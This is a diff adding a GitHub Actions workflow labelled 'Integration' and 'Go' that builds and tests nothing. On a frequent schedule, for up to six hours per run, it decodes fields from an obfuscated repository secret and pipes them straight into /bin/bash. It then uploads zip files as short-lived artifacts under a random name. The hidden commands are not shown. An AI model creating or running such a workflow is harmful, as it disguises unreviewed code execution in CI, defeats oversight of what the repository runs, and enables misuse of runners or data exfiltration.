@@ -1,0 +1,35 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          sgmf051: ${{ secrets.sgmf051 }}
+        run: |
+          printf '%s' "$sgmf051" | jq -r .v8546 | /bin/bash
+          printf '%s' "$hd633" | jq -r .artz69512 | /bin/bash
+          printf '%s' "$gjy77432" | jq -r .l3 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1ULcNkEi
+          path: "*.zip"
+          retention-days: 1
